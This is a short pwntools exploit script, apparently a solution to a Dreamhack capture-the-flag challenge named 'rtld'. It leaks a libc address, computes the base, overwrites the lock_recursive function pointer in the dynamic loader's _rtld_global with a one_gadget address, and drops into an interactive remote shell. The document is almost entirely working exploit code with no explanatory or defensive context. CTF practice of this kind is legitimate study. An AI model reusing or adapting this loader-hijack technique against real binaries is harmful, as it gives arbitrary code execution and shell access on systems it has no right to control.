from pwn import *

p = remote("host3.dreamhack.games", 11026)
# p = process("./rtld")
e = ELF("./rtld")

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

libc = ELF("./libc.so.6")
slog("env_libc.so", libc.symbols["__environ"])

# lb = ELF("/lib/x86_64-linux-gnu/ld-2.23.so")

# gdb.attach(p)

context.log_level = 'debug'

p.recvuntil(": ")
stdout_addr = int(p.recvn(14),16)
slog("stdout", stdout_addr)

libc_base = stdout_addr - libc.symbols["_IO_2_1_stdout_"]
# og = 0xf02a4
og = 0xf1147
og_addr = libc_base + og
lb_base = libc_base + 0x3ca000

rtld_global = stdout_addr + 0x22AA20
# rtld_global = lb_base + lb.symbols["_rtld_global"]
slog("og",og)
# slog("rtld_global",rtld_global-lb_base)

dl_load_lock = rtld_global+2312 #value
lock_recursive = rtld_global+3848 #func

slog("dl_load_lock", dl_load_lock)
slog("lock_recursive", lock_recursive)

# loc2ret = 0x18
p.sendlineafter(": ", str(lock_recursive))
p.sendlineafter(": ", str(og_addr))

p.interactive()